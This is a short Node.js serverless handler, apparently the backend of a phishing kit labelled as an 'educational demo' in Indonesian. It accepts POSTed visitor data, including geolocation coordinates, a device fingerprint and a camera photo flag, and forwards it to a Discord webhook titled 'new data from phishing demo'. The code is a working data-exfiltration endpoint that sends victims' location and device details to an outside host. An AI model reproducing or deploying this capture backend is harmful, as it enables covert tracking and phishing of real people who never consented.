// api/capture.js
export default async function handler(req, res) {
  // Hanya terima POST
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
  if (!webhookUrl) {
    console.error('Missing DISCORD_WEBHOOK_URL');
    return res.status(500).json({ error: 'Webhook not configured' });
  }

  try {
    const data = req.body;

    // Kirim ke Discord (versi sederhana)
    const discordRes = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: '📸 **Data Baru dari Demo Phishing**',
        embeds: [{
          title: 'Hasil Capture',
          color: 0x00ff00,
          fields: [
            { name: '📍 Lokasi', value: data.location ? `${data.location.lat}, ${data.location.lng}` : 'Tidak ada', inline: true },
            { name: '📱 Perangkat', value: data.fingerprint?.userAgent?.substring(0, 50) || 'N/A', inline: true },
            { name: '📷 Foto', value: data.photo ? '✅ Ada' : '❌ Tidak ada', inline: true }
          ],
          footer: { text: 'Demo Edukasi' }
        }]
      })
    });

    if (!discordRes.ok) {
      throw new Error(`Discord error: ${discordRes.status}`);
    }

    res.status(200).json({ success: true });
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
}